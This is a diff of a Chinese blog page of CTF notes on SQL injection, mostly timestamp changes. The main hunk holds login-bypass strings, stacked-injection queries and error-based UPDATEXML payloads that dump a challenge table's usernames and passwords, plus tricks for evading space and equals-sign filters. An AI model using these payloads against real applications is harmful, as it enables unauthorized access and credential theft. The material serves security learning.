@@ -45,7 +45,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2024-12-03T14:18:31.000Z">
-<meta property="article:modified_time" content="2025-01-01T10:36:26.000Z">
+<meta property="article:modified_time" content="2025-01-01T11:44:18.000Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -2112,7 +2112,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     root: '/',
     debug: "env",
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1735730303727),
+    lastupdate: new Date(1738489869282),
     cdn: {
       izitoast_css: 'https://cdn.bootcdn.net/ajax/libs/izitoast/1.4.0/css/iziToast.min.css',
       izitoast_js: 'https://cdn.bootcdn.net/ajax/libs/izitoast/1.4.0/js/iziToast.min.js',
@@ -2912,7 +2912,19 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li><p>堆叠注入<br>SQL语句以;结尾，堆叠注入原理是通过结束符同时执行多条SQL语句（前提存在SQL漏洞，;没有被过滤，只有当调用数据库函数支持执行多条SQL语句时才能够使用）。</p>
 </li>
 </ol>
-<p>xxx; SHOW DATABASES; –+：爆数据库。<br>xxx; SHOW TABLES; –+：爆表。<br>xxx; SHOW COLUMNS FROM user; –+：爆列。<br>xxx; SELECT * FROM user; –+：爆数据。<br>5. 万能密码<br>数值型万能账号：1 or 1&#x3D;1 #，万能密码，会直接登录成功，但不具有任何权限，适用于弱口令爆破。<br>单引号字符型万能密码：1’ or 1&#x3D;1 #<br>双引号字符型万能密码：1” or 1&#x3D;1 #<br>admin’ or 1&#x3D;1#<br>6. 报错注入<br>爆库：1’ AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)#<br>爆表：1’ AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;DATABASE()),0x7e),1) #<br>爆字段：1’ AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA&#x3D;’dvwa’ AND TABLE_NAME&#x3D;’users’),0x7e),1) #<br>爆数据库内容：1’ AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(first_name,0x7e,last_name) FROM dvwa.users)),1) #<br>7. Handler<br>HANDLER 表名 OPEN;<br>HANDLER 表名 READ FIRST;<br>HANDLER 表名 CLOSE;</p>
+<p>xxx; SHOW DATABASES; –+：爆数据库。<br>xxx; SHOW TABLES; –+：爆表。<br>xxx; SHOW COLUMNS FROM user; –+：爆列。<br>xxx; SELECT * FROM user; –+：爆数据。</p>
+<ol start="5">
+<li><p>万能密码<br>数值型万能账号：1 or 1&#x3D;1 #，万能密码，会直接登录成功，但不具有任何权限，适用于弱口令爆破。<br>单引号字符型万能密码：1’ or 1&#x3D;1 #<br>双引号字符型万能密码：1” or 1&#x3D;1 #<br>admin’ or 1&#x3D;1#</p>
+</li>
+<li><p>报错注入</p>
+</li>
+</ol>
+<p>爆库：admin’or(updatexml(1,concat(0x7e,database(),0x7e),1))#<br>爆表：admin’or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(‘geek’)),0x7e),1))#<br>爆字段：admin’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’)),0x7e),1))#<br>爆数据库内容：admin’or(updatexml(1,concat(0x7e,(select(group_concat(id,’<del>‘,username,’</del>‘,password))from(H4rDsq1)),0x7e),1))#<br>爆右边一半:admin’or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1：空格被过滤可以使用/**/或者()绕过</span><br><span class="line">2：=号被过滤可以用like来绕过</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li>Handler<br>HANDLER 表名 OPEN;<br>HANDLER 表名 READ FIRST;<br>HANDLER 表名 CLOSE;</li>
+</ol>
 
   </div>
   
@@ -2937,7 +2949,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-01-01T18:36:26+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-01-01T19:44:18+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：Jan 1, 2025</p>
@@ -3586,7 +3598,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/","sameAs":["https://github.com/volantis-x"],"description":"分享技术知识，探讨编程问题，一起成长。"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://asd1238525.github.io/","name":"Yunlin's Blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://asd1238525.github.io/categories/CTF/","name":"CTF"}},{"@type":"ListItem","position":3,"item":{"@id":"http://asd1238525.github.io/2024/12/03/SQL/","name":"SQL"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","keywords":null,"description":"分享技术知识，探讨编程问题，一起成长。","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/","description":"分享技术知识，探讨编程问题，一起成长。"},"publisher":{"@type":"Organization","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://asd1238525.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"SQL","description":"分享技术知识，探讨编程问题，一起成长。","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://asd1238525.github.io/2024/12/03/SQL/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/"},"publisher":{"@type":"Organization","name":"Yunlin's Blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://asd1238525.github.io/2024/12/03/SQL/","wordCount":0,"datePublished":"2024-12-03T14:18:31.000Z","dateModified":"2025-01-01T10:36:26.000Z","articleSection":"CTF","keywords":"CTF","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/","sameAs":["https://github.com/volantis-x"],"description":"分享技术知识，探讨编程问题，一起成长。"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://asd1238525.github.io/","name":"Yunlin's Blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://asd1238525.github.io/categories/CTF/","name":"CTF"}},{"@type":"ListItem","position":3,"item":{"@id":"http://asd1238525.github.io/2024/12/03/SQL/","name":"SQL"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","keywords":null,"description":"分享技术知识，探讨编程问题，一起成长。","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/","description":"分享技术知识，探讨编程问题，一起成长。"},"publisher":{"@type":"Organization","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://asd1238525.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"SQL","description":"分享技术知识，探讨编程问题，一起成长。","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://asd1238525.github.io/2024/12/03/SQL/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/"},"publisher":{"@type":"Organization","name":"Yunlin's Blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://asd1238525.github.io/2024/12/03/SQL/","wordCount":0,"datePublished":"2024-12-03T14:18:31.000Z","dateModified":"2025-01-01T11:44:18.000Z","articleSection":"CTF","keywords":"CTF","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
